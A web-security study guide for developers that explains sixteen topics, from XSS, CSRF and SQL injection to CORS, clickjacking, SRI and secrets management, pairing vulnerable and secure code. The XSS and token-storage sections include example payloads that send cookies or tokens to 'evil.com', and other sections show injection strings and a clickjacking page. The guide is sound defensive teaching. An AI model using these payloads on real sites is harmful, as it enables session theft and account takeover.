# Batch 14 — Security
> Protecting your users and your app — the vulnerabilities every web developer must know.

---

## 1. OWASP Top 10

**One-line definition:** A community-maintained list of the 10 most critical web application security risks, updated every few years.

### Real-World Dev Example
The OWASP Top 10 (2021 edition) acts as a security checklist before you ship. If your app passes all 10, you've blocked the majority of known attack vectors.

```
Top 10 (2021):
A01 — Broken Access Control
A02 — Cryptographic Failures
A03 — Injection (SQL, XSS…)
A04 — Insecure Design
A05 — Security Misconfiguration
A06 — Vulnerable Components
A07 — Auth & Session Failures
A08 — Software Integrity Failures
A09 — Logging & Monitoring Failures
A10 — SSRF
```

### ASCII Diagram
```
[Your App] ←——— attacker probes each OWASP category
     |
     ├── A01: Can I access /admin without login?
     ├── A03: Can I inject SQL into the search box?
     └── A07: Can I brute-force the login?
```

### Gotchas & Dev Context
- OWASP is a *starting point*, not an exhaustive list
- A06 (Vulnerable Components) is often ignored — run `npm audit` regularly
- A09 (Logging failures) — apps that don't log can't detect breaches

### Production FAQ
**Q: Should I fix all 10 before launch?**
A: Fix A01–A03 and A07 at minimum. Others can be iterative.

**Q: Is OWASP only for backend?**
A: No — XSS (A03) and CSRF live in the frontend too.

---

## 2. XSS (Cross-Site Scripting) — Stored, Reflected, DOM

**One-line definition:** An attacker injects malicious JavaScript into a page that other users' browsers then execute.

### Real-World Dev Example
Attack scenario — comment box with no sanitization:
```html
<!-- Attacker posts this as a comment -->
<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>

<!-- Every visitor's browser executes it and leaks their cookies -->
```

**Three types:**
| Type | Where payload lives | Example |
|------|-------------------|---------|
| Stored | Database | Malicious comment saved and served |
| Reflected | URL param | `?search=<script>...` echoed back |
| DOM | Client JS | `innerHTML = location.hash` |

### ASCII Diagram
```
Stored XSS:
Attacker → POST comment with <script> → DB
                                         ↓
Victim visits page → browser executes attacker's script
```

### Vulnerable vs Secure
```js
// ❌ Vulnerable — raw innerHTML
div.innerHTML = userInput;

// ✅ Secure — use textContent or sanitize
div.textContent = userInput;
// or with DOMPurify:
div.innerHTML = DOMPurify.sanitize(userInput);
```

### Gotchas & Dev Context
- React/Vue escape by default — but `dangerouslySetInnerHTML` bypasses this
- DOM XSS is invisible to server-side scanners
- CSP (see §5) is your second line of defence

### Production FAQ
**Q: My framework escapes output, am I safe?**
A: Mostly — but watch `v-html`, `dangerouslySetInnerHTML`, and jQuery's `.html()`.

**Q: Can XSS happen without `<script>` tags?**
A: Yes — `<img onerror="...">`, `javascript:` URLs, SVG payloads all work.

---

## 3. CSRF (Cross-Site Request Forgery)

**One-line definition:** An attacker tricks a logged-in user's browser into making an unintended request to your server using the user's existing session cookie.

### Real-World Dev Example
Attack scenario:
```html
<!-- Evil page the victim visits -->
<img src="https://bank.com/transfer?to=attacker&amount=5000" />
<!-- Browser auto-sends the victim's session cookie with the request -->
```

### ASCII Diagram
```
Victim is logged into bank.com (has session cookie)
         |
Victim visits evil.com
         |
evil.com triggers GET/POST to bank.com
         |
bank.com sees valid session cookie → executes transfer ✓ (wrongly)
```

### Vulnerable vs Secure
```js
// ❌ Vulnerable — no CSRF token
app.post('/transfer', (req, res) => processTransfer(req.body));

// ✅ Secure — CSRF token validation (csurf middleware)
const csrf = require('csurf');
app.use(csrf({ cookie: true }));
app.post('/transfer', (req, res) => {
  // csurf automatically rejects requests without valid token
  processTransfer(req.body);
});
```

### Gotchas & Dev Context
- CSRF only works when the server uses cookie-based auth — JWT in `Authorization` header is naturally immune
- `SameSite=Strict` or `SameSite=Lax` on cookies kills most CSRF attacks
- GET requests should never mutate state

### Production FAQ
**Q: Does CORS prevent CSRF?**
A: No — CORS controls JS *reading* responses; the browser still *sends* the request.

**Q: Are SPAs with JWT tokens safe from CSRF?**
A: Yes — if the token is in the `Authorization` header, not a cookie.

---

## 4. SQL Injection

**One-line definition:** Attacker inserts SQL code into an input field, causing the database to execute unintended commands.

### Real-World Dev Example
Attack: entering `' OR '1'='1` as username bypasses login.

### Vulnerable vs Secure
```js
// ❌ Vulnerable — string concatenation
const query = `SELECT * FROM users WHERE username='${username}'`;
// Input: admin' --
// Becomes: SELECT * FROM users WHERE username='admin' --'
// Comment (--) drops the password check entirely

// ✅ Secure — parameterised query
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username], callback);

// ✅ Also secure — ORM
const user = await User.findOne({ where: { username } }); // Sequelize
```

### ASCII Diagram
```
Input: ' OR '1'='1
         ↓
Raw SQL:  SELECT * FROM users WHERE name='' OR '1'='1'
                                              ^^^^^^^^^^
                                              Always TRUE → full table dump
```

### Gotchas & Dev Context
- ORMs are not 100% safe — raw query escape hatches (`sequelize.query()`) still need params
- SQLi can also target UPDATE, INSERT, DELETE — not just SELECT
- Error messages that reveal DB schema are a gift to attackers — suppress them in prod

### Production FAQ
**Q: I use an ORM, am I safe?**
A: Mostly — avoid raw query methods without parameterization.

**Q: Can NoSQL databases be injected?**
A: Yes — MongoDB has NoSQL injection via `$where` and unsanitized JSON operators.

---

## 5. Content Security Policy (CSP)

**One-line definition:** An HTTP header that tells the browser which sources of scripts, styles, and images are trusted — blocking everything else.

### Real-World Dev Example
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; object-src 'none'
```
Even if an XSS payload is injected, the browser refuses to execute scripts from unknown origins.

### ASCII Diagram
```
Browser loads page from yourapp.com
        |
Finds <script src="https://evil.com/steal.js">
        |
Checks CSP: script-src 'self' cdn.jsdelivr.net
        |
evil.com NOT in allowlist → BLOCKED 🛑
```

### Vulnerable vs Secure
```js
// ❌ No CSP — all scripts allowed
// (no header set at all)

// ✅ CSP via helmet.js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'", "https://cdn.jsdelivr.net"],
    imgSrc:     ["'self'", "data:"],
    objectSrc:  ["'none'"],
  }
}));
```

### Gotchas & Dev Context
- `'unsafe-inline'` and `'unsafe-eval'` defeat the purpose of CSP — avoid them
- Use `Content-Security-Policy-Report-Only` first to test without breaking things
- Nonces (`'nonce-abc123'`) allow specific inline scripts safely

### Production FAQ
**Q: Does CSP replace input sanitization?**
A: No — it's a *mitigation layer*, not a replacement. Defence in depth.

**Q: CSP broke my Google Analytics / Stripe — help?**
A: Add their CDN domains to `scriptSrc`. Check browser console for CSP violation details.

---

## 6. HTTPS Everywhere

**One-line definition:** Always serve your app over TLS (HTTPS) so data in transit is encrypted and cannot be read or tampered with.

### Real-World Dev Example
On HTTP, a coffee-shop attacker can intercept login forms:
```
[User types password] → plain text over network → [Attacker reads it]

[User types password] → TLS encrypted → [Attacker sees gibberish]
```

### ASCII Diagram
```
HTTP:
  Browser ——— username=alice&pass=secret ———→ Server
              (visible to anyone on network)

HTTPS (TLS):
  Browser ——— 7f3a9b2c1d...encrypted...e4f8 ——→ Server
              (unreadable without private key)
```

### Vulnerable vs Secure
```js
// ❌ No redirect — HTTP allowed
app.get('/', handler);

// ✅ Force HTTPS redirect + HSTS header
app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(301, 'https://' + req.hostname + req.url);
  }
  next();
});
// HSTS header (via helmet):
app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));
```

### Gotchas & Dev Context
- HTTPS doesn't mean the *site* is safe — phishing sites use HTTPS too
- HSTS (HTTP Strict Transport Security) prevents protocol downgrade attacks
- Mixed content (HTTPS page loading HTTP assets) breaks security and throws browser warnings
- Let's Encrypt gives free TLS certificates

### Production FAQ
**Q: My API is internal-only — does it need HTTPS?**
A: Yes — internal networks can be compromised; always encrypt.

**Q: What is HSTS preloading?**
A: Browsers ship with a list of HSTS-only domains. Submit yours at hstspreload.org for maximum protection.

---

## 7. Secure Headers (Helmet.js)

**One-line definition:** HTTP response headers that instruct the browser to enable built-in security features — Helmet.js sets them automatically for Express apps.

### Real-World Dev Example
```js
const helmet = require('helmet');
app.use(helmet()); // Sets ~14 security headers with sane defaults
```

### Key Headers Helmet Sets
| Header | Purpose |
|--------|---------|
| `X-Frame-Options` | Prevents clickjacking |
| `X-Content-Type-Options` | Stops MIME sniffing |
| `Strict-Transport-Security` | Enforces HTTPS |
| `X-XSS-Protection` | Legacy XSS filter (browsers) |
| `Referrer-Policy` | Controls referrer leakage |
| `Permissions-Policy` | Restricts browser features (camera, mic…) |

### Vulnerable vs Secure
```js
// ❌ Default Express — no security headers
const express = require('express');
const app = express();

// ✅ With Helmet
const helmet = require('helmet');
app.use(helmet());
// Optionally fine-tune:
app.use(helmet({ frameguard: { action: 'deny' } }));
```

### ASCII Diagram
```
HTTP Response without Helmet:
  HTTP/1.1 200 OK
  Content-Type: text/html   ← only basic headers

With Helmet:
  HTTP/1.1 200 OK
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Strict-Transport-Security: max-age=31536000
  ... (11 more)
```

### Gotchas & Dev Context
- Helmet doesn't set CSP by default in v5+ — configure it explicitly
- Some headers break older browser support — test before blindly enabling all
- Check headers at securityheaders.com

### Production FAQ
**Q: Is Helmet enough for full security?**
A: No — it's one layer. You still need input validation, auth checks, etc.

**Q: Non-Express frameworks?**
A: Similar libraries exist — `django-csp`, `Flask-Talisman`, `NestJS helmet` middleware.

---

## 8. Input Validation & Sanitization

**One-line definition:** Validation checks that input *conforms to expected rules*; sanitization *cleans or transforms* input to remove dangerous content.

### Real-World Dev Example
```js
// ❌ No validation — accept anything
app.post('/register', (req, res) => {
  db.createUser(req.body.email, req.body.age);
});

// ✅ With Joi validation + sanitization
const Joi = require('joi');
const schema = Joi.object({
  email: Joi.string().email().required(),
  age:   Joi.number().integer().min(13).max(120).required(),
});
app.post('/register', (req, res) => {
  const { error, value } = schema.validate(req.body);
  if (error) return res.status(400).json({ error: error.details });
  db.createUser(value.email, value.age); // value is clean
});
```

### Gotchas & Dev Context
- **Validate on the server** — client-side validation is UX only, never security
- Sanitize for *context*: HTML output needs HTML sanitization; SQL needs parameterization
- Allowlists beat denylists — define what's allowed, reject everything else
- Never trust `Content-Type` — validate the actual payload structure

### ASCII Diagram
```
User Input → [Validate: right shape?] → [Sanitize: strip dangerous bits] → Business Logic
               ↓ No                        ↓ Cleaned
            400 Error                   Safe value stored
```

### Production FAQ
**Q: Isn't sanitization enough without validation?**
A: No — sanitization may silently alter data. Validation ensures it's correct first.

**Q: What library for frontend validation?**
A: `zod` or `yup` for TypeScript/React; always mirror server-side rules.

---

## 9. Authentication Best Practices

**One-line definition:** The set of patterns that ensure "you are who you say you are" checks can't be bypassed, guessed, or stolen.

### Real-World Dev Example
```js
// ❌ Storing plain text password
db.save({ password: req.body.password });

// ✅ Bcrypt hashing with salt
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;
const hash = await bcrypt.hash(req.body.password, SALT_ROUNDS);
db.save({ password: hash });

// Verify
const valid = await bcrypt.compare(inputPassword, storedHash);
```

### Core Checklist
| Practice | Why |
|----------|-----|
| Hash passwords (bcrypt/argon2) | Breach dumps are useless |
| Enforce MFA | Stolen password alone isn't enough |
| Account lockout after N failures | Stops brute force |
| Secure "forgot password" flow | Magic link > secret questions |
| Session invalidation on logout | Prevent session replay |

### Gotchas & Dev Context
- Never roll your own auth — use battle-tested libraries (Passport.js, Auth0, NextAuth)
- `MD5` and `SHA1` are not password hashing algorithms — use bcrypt/argon2
- Email enumeration: don't reveal if an email exists via error messages
- JWT `alg: none` attack — always validate and pin the algorithm

### Production FAQ
**Q: bcrypt vs argon2 — which to use?**
A: Argon2id is the modern winner. Bcrypt is fine for existing systems.

**Q: Do I need MFA for an internal tool?**
A: Yes — insider threat and credential stuffing are real risks everywhere.

---

## 10. Token Storage (HttpOnly Cookies vs localStorage)

**One-line definition:** Where you store auth tokens determines what attacks can steal them — HttpOnly cookies are invisible to JavaScript; localStorage is not.

### Real-World Dev Example
```js
// ❌ localStorage — readable by any JS on the page (XSS steals it)
localStorage.setItem('token', jwtToken);

// ✅ HttpOnly Cookie — JS cannot read it at all
res.cookie('token', jwtToken, {
  httpOnly: true,   // JS can't access document.cookie
  secure: true,     // HTTPS only
  sameSite: 'Strict', // CSRF protection
  maxAge: 3600000,
});
```

### ASCII Diagram
```
localStorage:
  XSS injects: fetch('evil.com?t=' + localStorage.getItem('token'))
  → TOKEN STOLEN 💀

HttpOnly Cookie:
  XSS injects: document.cookie → ""  (empty — browser hides it)
  → TOKEN SAFE ✅ (but CSRF risk — mitigate with SameSite + CSRF token)
```

### Comparison
| | localStorage | HttpOnly Cookie |
|--|-------------|----------------|
| XSS risk | High (JS readable) | None |
| CSRF risk | None | Present (mitigate with SameSite) |
| Expiry control | Manual | `maxAge` / `expires` |
| Works cross-origin | Yes | No (SameSite) |

### Gotchas & Dev Context
- `sessionStorage` has the same XSS risk as localStorage
- Memory storage (JS variable) is safest from XSS but lost on tab close
- Never store refresh tokens in localStorage

### Production FAQ
**Q: My SPA needs to read the token to decode claims — cookies hide it.**
A: Store a *non-sensitive* copy of claims in localStorage; keep the actual token in HttpOnly cookie.

**Q: Can HttpOnly cookies be stolen at all?**
A: Yes — via network (without HTTPS) or CSRF. Mitigate with `secure` + `SameSite` flags.

---

## 11. Rate Limiting & Brute Force Protection

**One-line definition:** Restricting how many requests a client can make in a time window to prevent automated attacks like password guessing or scraping.

### Real-World Dev Example
```js
// ❌ No rate limiting — attacker can try 100,000 passwords/sec
app.post('/login', loginHandler);

// ✅ express-rate-limit
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                   // 10 attempts per window
  message: 'Too many login attempts, try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/login', loginLimiter, loginHandler);
```

### ASCII Diagram
```
Normal user:         1 req/min  → ✅ allowed
Brute force bot: 1000 req/min  → 🛑 blocked after limit
                                  (429 Too Many Requests)
```

### Gotchas & Dev Context
- Rate limit by IP *and* by username — attacker can rotate IPs
- Add exponential back-off: each failed attempt waits longer
- Implement CAPTCHA after 3–5 failed attempts
- For distributed apps, use Redis-backed rate limiters (`rate-limit-redis`) — in-memory won't share across instances
- Don't forget rate limiting on password reset, OTP, and registration endpoints

### Production FAQ
**Q: Legitimate users behind a corporate NAT share one IP — won't I block them?**
A: Set limits generously for login (e.g., 20/15min) and use user-level tracking alongside IP.

**Q: Can attackers bypass IP-based rate limiting?**
A: Yes, via botnets. Add device fingerprinting, CAPTCHA, and account-level lockout as extra layers.

---

## 12. Dependency Vulnerabilities (npm audit, Snyk)

**One-line definition:** Third-party packages you install can contain known security flaws — scanning tools flag them before attackers exploit them.

### Real-World Dev Example
```bash
# Scan for vulnerabilities
npm audit

# Output example:
# found 3 vulnerabilities (1 moderate, 2 high)
# lodash  <4.17.21  Prototype Pollution — upgrade to 4.17.21

# Auto-fix safe updates
npm audit fix

# For deeper scanning with CVE database + CI integration:
npx snyk test
```

### Vulnerable vs Secure
```json
// ❌ Pinning old versions with known CVEs
"dependencies": {
  "lodash": "4.17.4",
  "axios":  "0.19.0"
}

// ✅ Keep up to date + audit in CI
// package.json script:
"scripts": {
  "audit": "npm audit --audit-level=high"
}
// Run in CI pipeline — fail build on high severity
```

### Gotchas & Dev Context
- Transitive dependencies (dependencies of dependencies) are the sneaky ones — `npm audit` catches those too
- `npm audit fix --force` can introduce breaking changes — review diffs
- Snyk offers GitHub PR checks that auto-flag new vulnerabilities
- Lock files (`package-lock.json`) prevent surprise upgrades — commit them

### Production FAQ
**Q: All my vulnerabilities are in devDependencies — should I worry?**
A: Less so for prod, but build pipeline compromise (supply chain attack) is a real risk.

**Q: npm audit shows 50 issues — do I fix all of them today?**
A: Triage by severity. Fix Critical and High immediately; schedule Moderate/Low.

---

## 13. CORS Misconfiguration

**One-line definition:** CORS (Cross-Origin Resource Sharing) controls which domains can call your API — misconfiguring it lets any website make authenticated requests on behalf of your users.

### Real-World Dev Example
```js
// ❌ Wildcard with credentials — INVALID but often attempted
app.use(cors({ origin: '*', credentials: true }));
// Browsers block this combination, but devs then do worse:

// ❌ Reflect any origin blindly
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // Any origin!
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// ✅ Allowlist known origins
const allowedOrigins = ['https://yourapp.com', 'https://admin.yourapp.com'];
app.use(cors({
  origin: (origin, cb) => {
    if (!origin || allowedOrigins.includes(origin)) cb(null, true);
    else cb(new Error('CORS: origin not allowed'));
  },
  credentials: true,
}));
```

### ASCII Diagram
```
evil.com → fetch('https://api.yourapp.com/user/data', {credentials:'include'})
              |
CORS misconfigured: Allow-Origin: evil.com → browser allows → data leaked
CORS correct:       Allow-Origin: yourapp.com → evil.com blocked 🛑
```

### Gotchas & Dev Context
- CORS is enforced by *browsers*, not servers — curl/Postman ignores it
- `null` origin (file://, sandboxed iframes) can match a naive `*` allow — be explicit
- Pre-flight OPTIONS requests must also be handled correctly

### Production FAQ
**Q: My API is public — is `*` origin okay?**
A: Yes — *without* `credentials: true`. Public read-only APIs can use `*`.

**Q: CORS errors in dev — can I just disable it?**
A: Use a dev proxy (Vite/CRA built-in) instead of opening CORS blindly.

---

## 14. Clickjacking

**One-line definition:** An attacker embeds your site invisibly inside an `<iframe>` and tricks users into clicking buttons they can't see (e.g., "Confirm Transfer").

### Real-World Dev Example
Attack scenario:
```html
<!-- evil.com page -->
<style>
  iframe { opacity: 0; position: absolute; top: 0; left: 0; }
  button { position: absolute; top: 50px; left: 100px; }
</style>
<iframe src="https://bank.com/transfer?confirm=true"></iframe>
<button>Click here to win a prize! 🎁</button>
<!-- Victim clicks "prize" button — actually clicks bank's "Confirm" -->
```

### ASCII Diagram
```
evil.com visible layer:  [ WIN A PRIZE button ]
                                  ↓ (click lands here)
bank.com invisible layer: [ CONFIRM TRANSFER button ]  opacity: 0
```

### Vulnerable vs Secure
```js
// ❌ No framing protection
// (no header set)

// ✅ X-Frame-Options header
res.setHeader('X-Frame-Options', 'DENY');
// or via Helmet:
app.use(helmet({ frameguard: { action: 'deny' } }));

// ✅ Modern CSP equivalent
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
```

### Gotchas & Dev Context
- `X-Frame-Options: SAMEORIGIN` allows your own domain to iframe your pages
- `frame-ancestors` in CSP is more flexible and supersedes `X-Frame-Options`
- Legitimate use: embedding your own widget — use `SAMEORIGIN` instead of `DENY`

### Production FAQ
**Q: My app is embedded in a partner's iframe — how do I allow only them?**
A: `Content-Security-Policy: frame-ancestors https://partner.com`

**Q: Does clickjacking work on mobile?**
A: Yes — tap hijacking is the mobile equivalent.

---

## 15. Subresource Integrity (SRI)

**One-line definition:** A browser security feature that verifies CDN-hosted files haven't been tampered with by checking a cryptographic hash before executing them.

### Real-World Dev Example
Attack scenario: your CDN gets compromised and `jquery.min.js` is swapped for a version with a keylogger. SRI detects the mismatch and blocks it.

```html
<!-- ❌ No SRI — trust CDN blindly -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>

<!-- ✅ With SRI — hash verified before execution -->
<script
  src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"
  integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g="
  crossorigin="anonymous">
</script>
```

### ASCII Diagram
```
Browser downloads script from CDN
        |
Computes SHA-256 hash of downloaded file
        |
Compares to `integrity` attribute hash
        |
Match ✅ → execute      Mismatch ❌ → block + console error
```

### Gotchas & Dev Context
- Generate the hash: `openssl dgst -sha256 -binary file.js | openssl base64 -A` or use srihash.com
- SRI only works with `crossorigin="anonymous"` attribute present
- Pinning to exact versions is key — a CDN version update changes the hash

### Production FAQ
**Q: Should I use SRI for my own self-hosted assets?**
A: Not necessary — SRI protects against third-party CDN compromise. Your own origin is within your control.

**Q: What if a CDN updates the file and breaks my hash?**
A: Pin exact package versions in the CDN URL (e.g., `@3.7.0` not `@3`). Update hash when you intentionally upgrade.

---

## 16. Secrets Management

**One-line definition:** The practice of storing API keys, DB passwords, and tokens *outside* your code so they're never exposed in version control or logs.

### Real-World Dev Example
```js
// ❌ Hardcoded secret — exposed in GitHub history forever
const stripe = require('stripe')('sk_live_abc123realkey');

// ✅ Environment variable
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
// .env file (local dev only, in .gitignore):
// STRIPE_SECRET_KEY=sk_live_abc123realkey
```

### ASCII Diagram
```
❌ Bad flow:
  Secret in code → pushed to GitHub → scraped by bots → account compromised

✅ Good flow:
  Secret in vault (AWS Secrets Manager / Vault) → injected at runtime → app uses it
  Code has NO secret → safe to be public
```

### Tooling
| Tool | Use Case |
|------|---------|
| `.env` + `dotenv` | Local dev |
| AWS Secrets Manager | Production cloud |
| HashiCorp Vault | Self-hosted, advanced |
| GitHub Actions Secrets | CI/CD pipelines |
| Doppler | Team secrets sync |

### Gotchas & Dev Context
- `.env` must be in `.gitignore` — always check with `git status` before committing
- Rotate secrets immediately if accidentally committed — `git history` is public
- Use `git-secrets` or `truffleHog` pre-commit hooks to catch leaks before push
- Don't log `process.env` — logs are often stored and aggregated

### Production FAQ
**Q: I accidentally pushed a secret — is deleting the commit enough?**
A: No — GitHub caches it. Revoke the secret immediately, then clean history with `git filter-branch` or BFG.

**Q: Can I use `.env` in production?**
A: Avoid it — use your platform's secret injection (Heroku Config Vars, AWS SSM, etc.) instead.

---

## Quick Reference — Security Cheat Sheet

```
Attack          →  Primary Defence
──────────────────────────────────────────────────────
XSS             →  Output escaping, DOMPurify, CSP
CSRF            →  CSRF tokens, SameSite cookies
SQL Injection   →  Parameterised queries, ORMs
Clickjacking    →  X-Frame-Options / frame-ancestors
Brute Force     →  Rate limiting, MFA, account lockout
Secret Leakage  →  Env vars, vaults, .gitignore
Dep. Vulns      →  npm audit, Snyk, dependency updates
MITM            →  HTTPS + HSTS everywhere
CDN Tampering   →  Subresource Integrity (SRI)
CORS Abuse      →  Allowlist origins, no wildcard+creds
```

> **Golden Rule:** Security is *layered*. No single fix covers everything. Combine validation, sanitization, proper auth, secure headers, and monitoring for real-world protection.
